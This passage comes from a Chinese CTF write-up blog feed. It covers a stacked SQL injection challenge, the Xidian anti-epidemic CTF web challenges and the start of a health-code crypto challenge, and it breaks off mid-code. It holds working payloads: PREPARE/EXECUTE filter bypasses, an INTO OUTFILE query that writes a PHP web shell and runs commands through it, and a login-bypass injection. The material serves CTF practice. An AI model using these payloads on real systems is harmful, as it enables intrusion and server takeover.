class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;QL&#x27;</span>);</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;MySQL&#x27;</span></span><br></pre></td></tr></table></figure><p>使用<code>char()</code>方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE jwt from concat(char(115,101,108,101,99,116), &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE jwt;#</span></span><br></pre></td></tr></table></figure><p>直接只用<code>concat()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE jwt from concat(&#x27;</span>sel<span class="string">&#x27; , &#x27;</span>ect<span class="string">&#x27;, &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE jwt;#</span></span><br></pre></td></tr></table></figure><p>使用<code>set</code>定义变量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sql=concat(char(115,101,108,101,99,116),&#x27;</span><span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE jwt from @sql;EXECUTE jwt;#</span></span><br></pre></td></tr></table></figure><h2 id="写入木马Getshell"><a href="#写入木马Getshell" class="headerlink" title="写入木马Getshell"></a>写入木马Getshell</h2><p>这个方法简直太强了通过查询发现用户是<code>root</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql=concat(&quot;s&quot;,&quot;elect user()&quot;);PREPARE sqla from @sql;EXECUTE sqla;</span></span><br></pre></td></tr></table></figure><p>再通过命令写入<code>php一句话木马</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql=concat(&quot;s&quot;,&quot;elect &#x27;</span><span class="operator">&lt;</span>?php <span class="variable">@print</span>_r(`$_GET[<span class="number">1</span>]`);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1</span>&quot;,char(46),&quot;php<span class="string">&#x27;&quot;);PREPARE sqla from @sql;EXECUTE sqla;</span></span><br></pre></td></tr></table></figure><p>然后直接通过访问<code>1.php</code>就可以执行任意命令了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.php?1=mysql -uroot -proot -e &quot;use supersqli;select flag from \`1919810931114514\`;&quot;</span><br></pre></td></tr></table></figure><p>这个方法简直是太强了，大佬太牛了！</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西电抗疫CTF(个人赛)</title>
      <link href="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E4%B8%AA%E4%BA%BA%E8%B5%9B)/"/>
      <url>/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E4%B8%AA%E4%BA%BA%E8%B5%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感谢西电举办的这次<code>抗疫CTF</code>，既是宣传了<code>CTF</code>，也可以让大家学到更多的抗疫知识，让我们一起为<code>西安加油</code>！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h2><p>AAEncode加密</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= <span class="regexp">/｀ｍ´）ﾉ ~┻━┻   /</span><span class="regexp">/*´∇｀*/</span> [<span class="string">&#x27;_&#x27;</span>]; o=(ﾟｰﾟ)  =_=<span class="number">3</span>; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: <span class="string">&#x27;_&#x27;</span> ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ <span class="string">&#x27;_&#x27;</span>)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [c^_^o];(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>] = ((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>] = ((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>]+(ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>]+(ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟｰﾟ] + ((ﾟДﾟ) +<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [<span class="string">&#x27;c&#x27;</span>]+((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [<span class="string">&#x27;o&#x27;</span>]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ];(ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+<span class="string">&#x27;_&#x27;</span>) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==<span class="number">3</span>) +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]+ (ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=<span class="string">&#x27;\\&#x27;</span>; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +<span class="string">&#x27;_&#x27;</span>)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=<span class="string">&#x27;\&quot;&#x27;</span>;(ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] ( (ﾟДﾟ) [<span class="string">&#x27;_&#x27;</span>] (ﾟεﾟ+<span class="comment">/*´∇｀*/</span>(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (<span class="string">&#x27;_&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在网站在线解密<a href="http://www.atoolbox.net/Tool.php?Id=703">http://www.atoolbox.net/Tool.php?Id=703</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;everything-will-be-fine&#125;;</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>使用<code>GET</code>给<code>answer</code>传参</p><p>选错输出<code>选错了哦</code>，没选完整输出<code>还有错误的选项哦</code>，选项不多手动试了几下答案为<code>B，E</code></p><p><strong>PS：既然是抗疫CTF，我们不是不能就这样的到<code>flag</code>就退出，还是要看一看问题来学习如何抗疫</strong></p><p>这里也可以写个脚本玩玩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.196.162.53:10000/&quot;</span></span><br><span class="line">answers = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>]</span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> answers:</span><br><span class="line">    payload = &#123;<span class="string">&quot;answer&quot;</span>: i&#125;</span><br><span class="line">    r = requests.get(url, params=payload)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;还有错误&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        answer += i+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">payload = &#123;<span class="string">&quot;answer&quot;</span>: answer[:-<span class="number">1</span>]&#125;</span><br><span class="line">r = requests.get(url, params=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="让我访问！"><a href="#让我访问！" class="headerlink" title="让我访问！"></a>让我访问！</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;HS&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>…..emmm，这个题好像是去年年底的<code>moectf 2021</code>中的一个原题，直接<code>burp</code>抓包将请求 方式改成<code>HS</code>就好</p><p><img src="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E4%B8%AA%E4%BA%BA%E8%B5%9B)/202201042128950.png" alt="image-20220103162934456"></p><h2 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h2><p>小游戏的题，直接在<code>js</code>代码里找触发<code>flag</code>的方法，在<code>crash.js</code>最后找到可疑代码，格式化后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x8818 = [<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;0x2&#x27;</span>, <span class="string">&#x27;0x3&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;0x1&#x27;</span>, <span class="string">&#x27;indexOf&#x27;</span>, <span class="string">&#x27;0x4&#x27;</span>, <span class="string">&#x27;02U03002P02V03F01X03E02N02803002P03202T02N03B02P03602N01D03702N03703302N03B03303202S02T03602U03903000X03H&#x27;</span>, <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> _0x57c3 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x881849, _0x57c32c</span>) </span>&#123; _0x881849 = _0x881849 - <span class="number">0x0</span>; <span class="keyword">var</span> _0x4b9e4f = _0x8818[_0x881849]; <span class="keyword">return</span> _0x4b9e4f; &#125;;</span><br><span class="line"><span class="keyword">var</span> _0x5959 = [<span class="string">&#x27;0x1&#x27;</span>, _0x57c3(<span class="string">&#x27;0x4&#x27;</span>), _0x57c3(<span class="string">&#x27;0xa&#x27;</span>), _0x57c3(<span class="string">&#x27;0x7&#x27;</span>)];</span><br><span class="line"><span class="keyword">var</span> _0x293e = <span class="function"><span class="keyword">function</span>(<span class="params">_0x2dd26e, _0x5ee868</span>) </span>&#123; _0x2dd26e = _0x2dd26e - <span class="number">0x0</span>; <span class="keyword">var</span> _0xca48db = _0x5959[_0x2dd26e]; <span class="keyword">return</span> _0xca48db; &#125;;</span><br><span class="line"><span class="keyword">var</span> _0x10fd = [_0x57c3(<span class="string">&#x27;0x5&#x27;</span>), _0x293e(_0x57c3(<span class="string">&#x27;0x6&#x27;</span>)), _0x57c3(<span class="string">&#x27;0x3&#x27;</span>), <span class="string">&#x27;charAt&#x27;</span>, _0x293e(<span class="string">&#x27;0x3&#x27;</span>)];</span><br><span class="line"><span class="keyword">var</span> _0x8ffe = <span class="function"><span class="keyword">function</span>(<span class="params">_0x5dd332, _0x384d47</span>) </span>&#123; _0x5dd332 = _0x5dd332 - <span class="number">0x0</span>; <span class="keyword">var</span> _0x361472 = _0x10fd[_0x5dd332]; <span class="keyword">return</span> _0x361472; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0xb14cb12d</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x2689a7 = <span class="function"><span class="keyword">function</span>(<span class="params">_0x43d38a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _0x39b80f = _0x293e(_0x57c3(<span class="string">&#x27;0x1&#x27;</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x466eee = _0x39b80f[_0x8ffe(<span class="string">&#x27;0x1&#x27;</span>)];</span><br><span class="line">        <span class="keyword">var</span> _0x180e37, _0xb14adb, _0x38ce05, _0x1f9516, _0x21bae1 = <span class="number">0x0</span>,</span><br><span class="line">            _0x103ebd;</span><br><span class="line">        _0x103ebd = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">Math</span>[_0x8ffe(_0x57c3(<span class="string">&#x27;0x0&#x27;</span>))](_0x43d38a[_0x8ffe(_0x293e(<span class="string">&#x27;0x0&#x27;</span>))] / <span class="number">0x3</span>));</span><br><span class="line">        _0x180e37 = _0x103ebd[_0x8ffe(<span class="string">&#x27;0x1&#x27;</span>)];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _0x557bae = <span class="number">0x0</span>; _0x557bae &lt; _0x180e37; _0x557bae++) &#123;</span><br><span class="line">            _0xb14adb = _0x39b80f[_0x293e(_0x57c3(<span class="string">&#x27;0x2&#x27;</span>))](_0x43d38a[_0x8ffe(_0x57c3(<span class="string">&#x27;0x2&#x27;</span>))](_0x21bae1));</span><br><span class="line">            _0x21bae1++;</span><br><span class="line">            _0x38ce05 = _0x39b80f[<span class="string">&#x27;indexOf&#x27;</span>](_0x43d38a[_0x8ffe(<span class="string">&#x27;0x3&#x27;</span>)](_0x21bae1));</span><br><span class="line">            _0x21bae1++;</span><br><span class="line">            _0x1f9516 = _0x39b80f[_0x8ffe(_0x57c3(<span class="string">&#x27;0x8&#x27;</span>))](_0x43d38a[_0x8ffe(<span class="string">&#x27;0x3&#x27;</span>)](_0x21bae1));</span><br><span class="line">            _0x21bae1++;</span><br><span class="line">            _0x103ebd[_0x557bae] = _0xb14adb * _0x466eee * _0x466eee + _0x38ce05 * _0x466eee + _0x1f9516;</span><br><span class="line">        &#125;</span><br><span class="line">        _0x180e37 = <span class="built_in">eval</span>(<span class="string">&#x27;String.fromCharCode(&#x27;</span> + _0x103ebd[_0x8ffe(_0x57c3(<span class="string">&#x27;0x1&#x27;</span>))](<span class="string">&#x27;,&#x27;</span>) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> _0x180e37;</span><br><span class="line">    &#125;;</span><br><span class="line">    s = _0x57c3(<span class="string">&#x27;0x9&#x27;</span>);</span><br><span class="line">    s = _0x2689a7(s);</span><br><span class="line">    alert(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x102541</span>(<span class="params">_0x105247</span>) </span>&#123; <span class="keyword">if</span> (_0x105247 &gt; <span class="number">0x1388</span>) &#123; <span class="keyword">return</span> <span class="number">0x1</span>; &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0x0</span>; &#125;</span><br></pre></td></tr></table></figure><p>里面的方法<code>_0xb14cb12d()</code>像是加密解密算法，尝试在控制台运行一下，得到<code>flag</code></p><p>这种题之前见到过，这次算是凑巧做出来的，正常应该是要逆向分析<code>js</code></p><h2 id="真是个好简单的sql注入啊！"><a href="#真是个好简单的sql注入啊！" class="headerlink" title="真是个好简单的sql注入啊！"></a>真是个好简单的sql注入啊！</h2><p>直接就是一个登录框，试了一下单引号被过滤了，直接转义单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1\&amp;password=or 1=1#</span><br></pre></td></tr></table></figure><p>直接获得<code>flag</code></p><h2 id="你喜欢copy吗"><a href="#你喜欢copy吗" class="headerlink" title="你喜欢copy吗"></a>你喜欢copy吗</h2><p>通过<code>js</code>不允许勾选，在设置里禁用<code>js</code>，然后复制，直接提交即可</p><p>PS：蚌埠住啊，搞了半天解密，先是用<code>base36</code>解密出一堆数字就没了头绪，没想到直接提交就好……</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>健康码的题好有趣，让我学到了不少xixixi！</p><h2 id="Bob的健康码1"><a href="#Bob的健康码1" class="headerlink" title="Bob的健康码1"></a>Bob的健康码1</h2><p>查看<code>md</code>文件，然后再看<code>py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">database = &#123;</span><br><span class="line">    <span class="string">&#x27;alice&#x27;</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;bob&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;carol&#x27;</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;david&#x27;</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1. get health code from the database</span></span><br><span class="line"><span class="string">2. show your code to help alice pass the checker</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">qrdecode</span>(<span class="params">self , qr , size</span>):</span></span><br><span class="line">        qr = b64decode(qr)</span><br><span class="line">        code = Image.frombytes(<span class="string">&#x27;1&#x27;</span> , size,qr)</span><br><span class="line">        m = pyzbar.decode(code)</span><br><span class="line">        <span class="keyword">return</span> m[<span class="number">0</span>].data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">qrencode</span>(<span class="params">self , data</span>):</span></span><br><span class="line">        qr = qrcode.QRCode(</span><br><span class="line">            error_correction = qrcode.ERROR_CORRECT_L,</span><br><span class="line">            border=<span class="number">1</span>,</span><br><span class="line">            box_size=<span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">        qr.add_data(data)</span><br><span class="line">        qr.make(fit=<span class="literal">True</span>)</span><br><span class="line">        img = qr.make_image()</span><br><span class="line">        self._send(b64encode(img.tobytes()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_hcode</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">            self._send(<span class="string">b&#x27;this one is not in the database&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>:name,</span><br><span class="line">                <span class="string">&#x27;time&#x27;</span>:<span class="built_in">int</span>(time.time()),</span><br><span class="line">                <span class="string">&#x27;isRed&#x27;</span>:database[name]</span><br><span class="line">            &#125;</span><br><span class="line">            data = 